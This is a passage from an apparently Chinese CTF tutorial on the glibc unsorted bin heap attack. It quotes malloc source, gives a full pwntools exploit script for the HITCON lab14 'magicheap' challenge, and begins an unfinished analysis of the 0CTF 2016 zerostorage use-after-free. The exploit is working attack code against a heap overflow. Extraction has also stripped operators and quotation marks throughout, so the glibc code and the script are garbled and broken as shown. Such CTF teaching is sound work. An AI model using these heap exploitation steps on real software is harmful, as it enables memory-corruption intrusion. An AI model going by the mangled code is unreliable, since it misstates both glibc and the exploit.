chunk\uff0c\u6240\u4ee5\u4f1a\u53bbunsorted bin\u4e2d\u627e\uff0c\u53d1\u73b0 unsorted bin \u4e0d\u7a7a\uff0c\u4e8e\u662f\u628a unsorted bin \u4e2d\u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u3002\n\n\n        \nwhile\n \n((\nvictim\n \n=\n \nunsorted_chunks\n(\nav\n)\n-\nbk\n)\n \n!=\n \nunsorted_chunks\n(\nav\n))\n \n{\n\n            \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n            \nif\n \n(\n__builtin_expect\n(\nchunksize_nomask\n(\nvictim\n)\n \n=\n \n2\n \n*\n \nSIZE_SZ\n,\n \n0\n)\n \n||\n\n                \n__builtin_expect\n(\nchunksize_nomask\n(\nvictim\n)\n \n \nav\n-\nsystem_mem\n,\n \n0\n))\n\n                \nmalloc_printerr\n(\ncheck_action\n,\n \nmalloc(): memory corruption\n,\n\n                                \nchunk2mem\n(\nvictim\n),\n \nav\n);\n\n            \nsize\n \n=\n \nchunksize\n(\nvictim\n);\n\n\n            \n/*\n\n\n               If a small request, try to use last remainder if it is the\n\n\n               only chunk in unsorted bin.  This helps promote locality for\n\n\n               runs of consecutive small requests. This is the only\n\n\n               exception to best-fit, and applies only when there is\n\n\n               no exact fit for a small chunk.\n\n\n             */\n\n            \n/* \u663e\u7136\uff0cbck\u88ab\u4fee\u6539\uff0c\u5e76\u4e0d\u7b26\u5408\u8fd9\u91cc\u7684\u8981\u6c42*/\n\n            \nif\n \n(\nin_smallbin_range\n(\nnb\n)\n \n \nbck\n \n==\n \nunsorted_chunks\n(\nav\n)\n \n\n                \nvictim\n \n==\n \nav\n-\nlast_remainder\n \n\n                \n(\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n \n(\nunsigned\n \nlong\n)\n \n(\nnb\n \n+\n \nMINSIZE\n))\n \n{\n\n                \n....\n\n            \n}\n\n\n            \n/* remove from unsorted list */\n\n            \nunsorted_chunks\n(\nav\n)\n-\nbk\n \n=\n \nbck\n;\n\n            \nbck\n-\nfd\n                 \n=\n \nunsorted_chunks\n(\nav\n);\n\n\n\n\n\n\n\nvictim = unsorted_chunks(av)-\nbk=p\n\n\nbck = victim-\nbk=p-\nbk = target addr-16\n\n\nunsorted_chunks(av)-\nbk = bck=target addr-16\n\n\nbck-\nfd                 = *(target addr -16+16) = unsorted_chunks(av);\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u5c06 unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u62ff\u51fa\u6765\u7684\u8fc7\u7a0b\u4e2d\uff0cvictim \u7684 fd \u5e76\u6ca1\u6709\u53d1\u6325\u4f5c\u7528\uff0c\u6240\u4ee5\u5373\u4f7f\u6211\u4eec\u4fee\u6539\u4e86\u5176\u4e3a\u4e00\u4e2a\u4e0d\u5408\u6cd5\u7684\u503c\u4e5f\u6ca1\u6709\u5173\u7cfb\u3002\n\u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cunsorted bin \u94fe\u8868\u53ef\u80fd\u5c31\u6b64\u7834\u574f\uff0c\u5728\u63d2\u5165 chunk \u65f6\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\u3002\n\n\n\u5373\u4fee\u6539 target \u5904\u7684\u503c\u4e3a unsorted bin \u7684\u94fe\u8868\u5934\u90e8 0x7f1c705ffb78\uff0c\u4e5f\u5c31\u662f\u4e4b\u524d\u8f93\u51fa\u7684\u4fe1\u606f\u3002\n\n\nWe free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78\nNow emulating a vulnerability that can overwrite the victim-\nbk pointer\nAnd we write it with the target address-16 \n(\nin \n32\n-bits machine, it should be target address-8\n)\n:0x7ffe0d232508\n\nLet\ns malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n0x7ffe0d232518: 0x7f1c705ffb78\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230 unsorted bin attack \u786e\u5b9e\u53ef\u4ee5\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u6240\u4fee\u6539\u6210\u7684\u503c\u5374\u4e0d\u53d7\u6211\u4eec\u63a7\u5236\uff0c\u552f\u4e00\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0c\u8fd9\u4e2a\u503c\u6bd4\u8f83\u5927\u3002\n\u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\n\n\n\u8fd9\u770b\u8d77\u6765\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u5904\uff0c\u4f46\u662f\u5176\u5b9e\u8fd8\u662f\u6709\u70b9\u5375\u7528\u7684\uff0c\u6bd4\u5982\u8bf4\n\n\n\n\n\u6211\u4eec\u901a\u8fc7\u4fee\u6539\u5faa\u73af\u7684\u6b21\u6570\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u591a\u6b21\u5faa\u73af\u3002\n\n\n\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 heap \u4e2d\u7684 global_max_fast \u6765\u4f7f\u5f97\u66f4\u5927\u7684 chunk \u53ef\u4ee5\u88ab\u89c6\u4e3a fast bin\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u53bb\u6267\u884c\u4e00\u4e9b fast bin attack\u4e86\u3002\n\n\n\n\nHITCON Training lab14 magic heap\n\n\n\u8fd9\u91cc\u6211\u4eec\u4fee\u6539\u4e00\u4e0b\u6e90\u7a0b\u5e8f\u4e2d\u7684 l33t \u51fd\u6570\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002\n\n\nvoid\n \nl33t\n()\n \n{\n \nsystem\n(\ncat ./flag\n);\n \n}\n\n\n\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  hitcontraining_lab14 git:\n(\nmaster\n)\n file magicheap \nmagicheap: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped\n\u279c  hitcontraining_lab14 git:\n(\nmaster\n)\n checksec magicheap \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u768464\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u4e0e Canary \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u81ea\u5df1\u5199\u7684\u5806\u7ba1\u7406\u5668\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd\n\n\n\n\n\u521b\u5efa\u5806\u3002\u6839\u636e\u7528\u6237\u6307\u5b9a\u5927\u5c0f\u7533\u8bf7\u76f8\u5e94\u5806\uff0c\u5e76\u4e14\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002\n\n\n\u7f16\u8f91\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u6839\u636e\u7528\u6237\u8bfb\u5165\u7684\u5927\u5c0f\uff0c\u6765\u4fee\u6539\u5806\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\n\n\n\u5220\u9664\u5806\u3002\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u5224\u65ad\u5bf9\u5e94\u5806\u662f\u4e0d\u662f\u975e\u7a7a\uff0c\u5982\u679c\u975e\u7a7a\uff0c\u5c31\u5c06\u5bf9\u5e94\u5806\u91ca\u653e\u5e76\u7f6e\u4e3a NULL\u3002\n\n\n\n\n\u540c\u65f6\uff0c\u6211\u4eec\u770b\u5230\uff0c\u5f53\u6211\u4eec\u63a7\u5236 v3 \u4e3a 4869\uff0c\u540c\u65f6\u63a7\u5236 magic \u5927\u4e8e 4869\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86\u3002\n\n\n\u5229\u7528\n\n\n\u5f88\u663e\u7136\uff0c \u6211\u4eec\u76f4\u63a5\u5229\u7528 unsorted bin attack \u5373\u53ef\u3002\n\n\n\n\n\u91ca\u653e\u4e00\u4e2a\u5806\u5757\u5230 unsorted bin \u4e2d\u3002\n\n\n\u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539 unsorted bin \u4e2d\u5bf9\u5e94\u5806\u5757\u7684 bk \u6307\u9488\u4e3a \nmagic-16\u3002\n\n\n\u89e6\u53d1\u6f0f\u6d1e\u5373\u53ef\u3002\n\n\n\n\n\u4ee3\u7801\u5982\u4e0b\n\n\n#!/usr/bin/env python\n\n\n# -*- coding: utf-8 -*-\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nprocess\n(\n./magicheap\n)\n\n\n\n\ndef\n \ncreate_heap\n(\nsize\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n1\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nedit_heap\n(\nidx\n,\n \nsize\n,\n \ncontent\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n2\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \ndel_heap\n(\nidx\n):\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\n3\n)\n\n    \nr\n.\nrecvuntil\n(\n:\n)\n\n    \nr\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ncreate_heap\n(\n0x20\n,\n \ndada\n)\n  \n# 0\n\n\ncreate_heap\n(\n0x80\n,\n \ndada\n)\n  \n# 1\n\n\n# in order not to merge into top chunk\n\n\ncreate_heap\n(\n0x20\n,\n \ndada\n)\n  \n# 2\n\n\n\ndel_heap\n(\n1\n)\n\n\n\nmagic\n \n=\n \n0x6020c0\n\n\nfd\n \n=\n \n0\n\n\nbk\n \n=\n \nmagic\n \n-\n \n0x10\n\n\n\nedit_heap\n(\n0\n,\n \n0x20\n \n+\n \n0x20\n,\n \na\n \n*\n \n0x20\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x91\n)\n \n+\n \np64\n(\nfd\n)\n \n+\n \np64\n(\nbk\n))\n\n\ncreate_heap\n(\n0x80\n,\n \ndada\n)\n  \n#trigger unsorted bin attack\n\n\nr\n.\nrecvuntil\n(\n:\n)\n\n\nr\n.\nsendline\n(\n4869\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n2016 0CTF zerostorage-\u5f85\u5b8c\u6210\n\n\n\u6ce8\uff1a\u5f85\u8fdb\u4e00\u6b65\u5b8c\u6210\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 0CTF \u7684zerostorage\u4e3a\u4f8b\uff0c\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u8fd9\u4e2a\u9898\u5f53\u65f6\u7ed9\u4e86\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u7248\u672c\u548c\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u81ea\u5df1\u53ef\u4ee5\u4e0b\u4e00\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u8fdb\u884c\u8c03\u8bd5\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u7528\u81ea\u5df1\u7684\u672c\u5730\u673a\u5668\u8c03\u8bd5\u4e86\u3002\u4f46\u662f\u5728\u76ee\u524d\u7684Ubuntu 16.04 \u4e2d\uff0c\u7531\u4e8e\u8fdb\u4e00\u6b65\u7684\u968f\u673a\u5316\uff0c\u5bfc\u81f4 libc \u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e0e\u7a0b\u5e8f\u6a21\u5757\u52a0\u8f7d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u76f8\u5bf9\u504f\u79fb\u4e0d\u518d\u56fa\u5b9a\uff0c\u6240\u4ee5 BrieflyX \u7684\u7b56\u7565\u5c31\u65e0\u6cd5\u518d\u6b21\u4f7f\u7528\uff0c\u4f3c\u4e4e\u53ea\u80fd\u7528 angelboy \u7684\u7b56\u7565\u4e86\u3002\n\n\n\u5b89\u5168\u6027\u68c0\u67e5\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u5f00\u542f\u4e86\u6240\u6709\u7684\u4fdd\u62a4\n\n\npwndbg\n checksec \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage\n\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n\n\n\n\n\u57fa\u672c\u529f\u80fd\u5206\u6790\n\n\n\u7a0b\u5e8f\u7ba1\u7406\u5728 bss \u6bb5\u7684\u5b58\u50a8\u7a7a\u95f4 storage \uff0c\u5177\u6709\u63d2\u5165\uff0c\u5220\u9664\uff0c\u5408\u5e76\uff0c\u5220\u9664\uff0c\u67e5\u770b\uff0c\u679a\u4e3e\uff0c\u9000\u51fa\u529f\u80fd\u3002\u8fd9\u4e2astorage\u7684\u7ed3\u6784\u4f53\u5982\u4e0b\n\n\n00000000 Storage         struc ; (sizeof=0x18, mappedto_7)\n00000000                                         ; XREF: .bss:storage_list/r\n00000000 use             dq ?\n00000008 size            dq ?\n00000010 xor_addr        dq ?\n00000018 Storage         ends\n\n\n\n\ninsert-1\n\n\n\u57fa\u672c\u529f\u80fd\u5982\u4e0b\n\n\n\n\n\u9010\u4e00\u67e5\u770b storage \u6570\u7ec4\uff0c\u67e5\u627e\u7b2c\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u5143\u7d20\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u7ec4\u6700\u5927\u4e5f\u5c31\u662f32\u3002\n\n\n\u8bfb\u53d6storage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002\n\n\n\u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b\n\n\n\u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b\n\n\n\u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b\n\n\n\u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002\n\n\n\n\n\n\n\u4f7f\u7528 calloc \u5206\u914d\u6307\u5b9a\u957f\u5ea6\uff0c\u6ce8\u610f calloc \u4f1a\u521d\u59cb\u5316 chunk \u4e3a0\u3002\n\n\n\u5c06 calloc \u5206\u914d\u7684\u5185\u5b58\u5730\u5740\u4e0e bss \u6bb5\u7684\u4e00\u4e2a\u5185\u5b58\uff08\u521d\u59cb\u65f6\u523b\u4e3a\u4e00\u4e2a\u968f\u673a\u6570\uff09\u8fdb\u884c\u6291\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u5185\u5b58\u5730\u5740\u3002\n\n\n\u6839\u636e\u8bfb\u53d6\u7684storage\u7684\u5927\u5c0f\u6765\u8bfb\u5165\u5185\u5bb9\u3002\n\n\n\u5c06\u5bf9\u5e94\u7684storage\u7684\u5927\u5c0f\u4ee5\u53ca\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u4fdd\u5b58\u5230\u5bf9\u5e94\u7684storage \u5143\u7d20\u4e2d\uff0c\u5e76\u6807\u8bb0\u8be5\u5143\u7d20\u5904\u4e8e\u53ef\u7528\u72b6\u6001\u3002\n\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bb0\u5f55\u7684storage\u7684\u5927\u5c0f\u662f\u81ea\u5df1\u8f93\u5165\u7684\u5927\u5c0f\uff01\uff01\uff01\n\n\n\u9012\u589e storage num\u7684\u6570\u91cf\u3002\n\n\n\n\nupdate-2\n\n\n\n\n\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5b58\u50a8\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u5165\u8981\u66f4\u65b0\u7684storage\u5143\u7d20\u7684id\uff0c\u5982\u679cid\u5927\u4e8e31\u6216\u8005\u76ee\u524d\u5904\u4e8e\u4e0d\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u8bf4\u660e\u4e0d\u5bf9\uff0c\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u53d6\n\u66f4\u65b0\u540e\nstorage \u5143\u7d20\u6240\u9700\u8981\u5b58\u50a8\u5185\u5bb9\u7684\u957f\u5ea6\u3002\n\n\n\u5982\u679c\u957f\u5ea6\u4e0d\u5927\u4e8e0\uff0c\u76f4\u63a5\u9000\u51fa\uff1b\n\n\n\u5426\u5219\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5c0f\u4e8e128\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a128\uff1b\n\n\n\u5426\u5219\uff0c\u5982\u679c\u7533\u8bf7\u7684\u5b57\u8282\u6570\u4e0d\u5927\u4e8e4096\uff0c\u90a3\u5c31\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6570\u503c\uff1b\n\n\n\u5426\u5219\uff0c\u8bbe\u7f6e\u4e3a4096\u3002\n\n\n\n\n\n\n\u6839\u636e bss \u6bb5\u5bf9\u5e94\u7684\u968f\u673a\u6570\u83b7\u53d6\u539f\u5148storage \u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\uff0c\n\n\n\u5982\u679c\u66f4\u65b0\u540e\u6240\u9700\u7684\u957f\u5ea6\u4e0d\u7b49\u4e8e\u66f4\u65b0\u524d\u7684\u957f\u5ea6\uff0c\u5c31\u4f7f\u7528realloc\u4e3a\u5176\u91cd\u65b0\u5206\u914d\u5185\u5b58\u3002\n\n\n\u518d\u6b21\u8bfb\u53d6\u6570\u636e\uff0c\u540c\u65f6\u66f4\u65b0storage \u5143\u7d20\u3002\n\n\n\n\nmerge-3\n\n\n\n\n\u5982\u679c\u6b63\u5728\u4f7f\u7528\u7684\u5143\u7d20\u4e0d\u5927\u4e8e1\u4e2a\uff0c\u90a3\u4e48\u65e0\u6cd5\u5408\u5e76\uff0c\u76f4\u63a5\u9000\u51fa\u5373\u53ef\u3002\n\n\n\u5224\u65adstorage\u662f\u5426\u5df2\u7ecf\u6ee1\u4e86\uff0c\u5982\u679c\u4e0d\u6ee1\uff0c\u627e\u51fa\u7a7a\u95f2\u7684\u90a3\u4e00\u5757\u3002\n\n\n\u5206\u522b\u8bfb\u53d6merge_from\u7684id\u4ee5\u53camerge_to\u7684id\u53f7\uff0c\u5e76\u8fdb\u884c\u76f8\u5e94\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u7684\u68c0\u6d4b\u3002\n\n\n\u6839\u636e\u6700\u521d\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u8ba1\u7b97\u4e24\u4e2a merge \u5230\u4e00\u8d77\u540e\u6240\u9700\u8981\u7684\u7a7a\u95f4\uff0c\n\u5982\u679c\u4e0d\u5927\u4e8e128\uff0c\u90a3\u5c31\u4e0d\u4f1a\u7533\u8bf7\u65b0\u7684\u7a7a\u95f4\n\uff0c\u5426\u5219\u5c31\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684\u65b0\u7684\u7a7a\u95f4\u3002\n\n\n\u4f9d\u6b21\u5c06merge_to\u4e0emerge_from\u7684\u5185\u5bb9\u62f7\u8d1d\u5230\u76f8\u5bf9\u5e94\u7684\u4f4d\u7f6e\u3002\n\n\n\u6700\u540e\u5b58\u50a8merge_from\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u88ab\u91ca\u653e\u4e86\uff0c\u4f46\u5e76\u6ca1\u6709\u88ab\u7f6e\u4e3aNULL\u3002\u540c\u65f6\uff0c\u5b58\u653emerge_to\u5185\u5bb9\u7684\u5185\u5b58\u5730\u5740\u5e76\u6ca1\u6709\u88ab\u91ca\u653e\uff0c\u76f8\u5e94\u7684storage\u7684\u6291\u6216\u540e\u7684\u5730\u5740\u53ea\u662f\u88ab\u7f6e\u4e3a\u4e86NULL\u3002\n\n\n\n\n\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u5728merge\u7684\u65f6\u5019\uff0c\u5e76\u6ca1\u6709\u68c0\u6d4b\u4e24\u4e2astorage\u7684ID\u662f\u5426\u76f8\u540c\u3002\n\n\ndelete-4\n\n\n\n\n\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u5982\u679c storage  \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002\n\n\n\u4e4b\u540e\u5c31\u662f\u5c06\u5143\u7d20\u5bf9\u5e94\u7684\u5b57\u6bb5\u5206\u522b\u8bbe\u7f6e\u4e3aNULL\uff0c\u5e76\u4e14\u91ca\u653e\u5bf9\u5e94\u7684\u5185\u5b58\u3002\n\n\n\n\nview-5\n\n\n\n\n\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u5982\u679c storage  \u7684\u5bf9\u5e94\u5143\u7d20\u5e76\u4e0d\u5728\u4f7f\u7528\u72b6\u6001\uff0c\u90a3\u4e48\u4e5f\u540c\u65f6\u8fd4\u56de\u3002\n\n\n\u8f93\u5165\u5bf9\u5e94\u7684storage \u7684\u5185\u5bb9\u3002\n\n\n\n\nlist-6\n\n\n\n\n\u5982\u679c\u6ca1\u6709\u5b58\u50a8\u4efb\u4f55\u5143\u7d20\uff0c\u90a3\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u8bfb\u53d6\u6307\u5b9a\u8981\u4fee\u6539\u7684storage\u7684\u5143\u7d20\u7684id\uff0c\u5982\u679c id \u5927\u4e8e32\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\u3002\n\n\n\u904d\u5386\u6240\u6709\u6b63\u5728\u4f7f\u7528\u7684storage\uff0c\u8f93\u5165\u5176\u5bf9\u5e94\u7684\u4e0b\u6807\u4ee5\u53ca\u5bf9\u5e94storage\u7684\u5927\u5c0f\u3002\n\n\n\n\n\u6f0f\u6d1e\u786e\u5b9a\n\n\n\u901a\u8fc7\u8fd9\u4e48\u7b80\u5355\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5 \u57fa\u672c\u786e\u5b9a\u6f0f\u6d1e\u4e3b\u8981\u5c31\u662f\u96c6\u4e2d\u5728insert\u64cd\u4f5c\u4e0emerge\u64cd\u4f5c\u4e2d\uff0c\u5c24\u5176\u662f\u5f53\u6211\u4eecmerge\u4e24\u4e2a\u8f83\u5c0fsize\u7684storage\u65f6\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\u3002\n\n\n\u6211\u4eec\u6765\u5177\u4f53\u5206\u6790\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u5728insert\u8fc7\u7a0b\u4e2d\u63d2\u5165\u8f83\u5c0f\u7684size\uff08\u6bd4\u59828\uff09\u7684storage  A\uff0c\u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u8fdb\u884cmerge\u65f6\uff0c\u5047\u8bbe\u6211\u4eec\u9009\u62e9merge\u7684\u4e24\u4e2astorage \u90fd\u4e3aA\uff0c\u90a3\u4e48\u6b64\u65f6\u7a0b\u5e8f\u4f1a\u76f4\u63a5\u628a\u5c31\u4f1a\u76f4\u63a5\u628aA\u7684\u5185\u5bb9\u518d\u6dfb\u52a0\u5230A\u7684\u539f\u6709\u5185\u5bb9\u7684\u540e\u9762\uff0c\u7136\u540e\u63a5\u7740\u5c31\u4f1a\u628aA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5185\u5b58free\u6389\uff0c\u4f46\u662f\u8fd9\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u56e0\u4e3aA\u5b58\u50a8\u5185\u5bb9\u7684\u5730\u5740\u88ab\u8d4b\u7ed9\u4e86\u53e6\u5916\u4e00\u4e2astorage\uff0c\u5f53\u518d\u8bbf\u95eemerge \u540e\u7684 storage B\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u7531\u4e8eB\u7684\u5b58\u50a8\u6570\u636e\u90e8\u5206\u7684\u5730\u5740\u5176\u5b9e\u5c31\u662fA\u5bf9\u5e94\u7684\u5b58\u50a8\u6570\u636e\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6253\u5370\u7684\u5c31\u662fA\u7684\u6570\u636e\u90e8\u5206\u7684\u5185\u5bb9\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e4b\u524d\u521a\u521a\u628aA\u5bf9\u5e94\u7684\u5185\u5b58\u91ca\u653e\u6389\uff0c\u800cA\u7531\u4e8e\u4e0d\u5728fast bin\u8303\u56f4\u5185\uff0c\u6240\u4ee5\u53ea\u4f1a\u88ab\u653e\u5230unsorted bin\u4e2d\uff08\u800c\u4e14\u6b64\u65f6\u53ea\u6709\u4e00\u4e2a\uff09\uff0c\u6240\u4ee5\u6b64\u65f6A\u7684fd\u548cbk\u90fd\u5b58\u653e\u7684\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002\n\n\n\u5982\u679c\u6211\u4eec\u5728merge\u4e4b\u524d\u66fe\u7ecf\u5220\u9664\u8fc7\u4e00\u4e2astorage C\uff0c\u90a3\u4e48\u5728\u6211\u4eecmerge A\u540e\uff0cA\u5c31\u4f1a\u63d2\u5728unsorted bin\u7684\u53cc\u5411\u94fe\u8868\u7684\u9996\u90e8\uff0c\u6240\u4ee5\u5176fd\u5219\u662fC\u5bf9\u5e94\u7684\u5730\u5740\uff0cbk\u5219\u662funsorted bin\u7684\u4e00\u4e2a\u57fa\u5730\u5740\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6cc4\u9732\u4e24\u4e2a\u5730\u5740\u3002\n\n\n\u800c\u4e14\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u53bb\u4fee\u6539merge\u540e\u7684B\u7684\u5185\u5bb9\u7684\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u5c31\u662f\u4e2aUse After 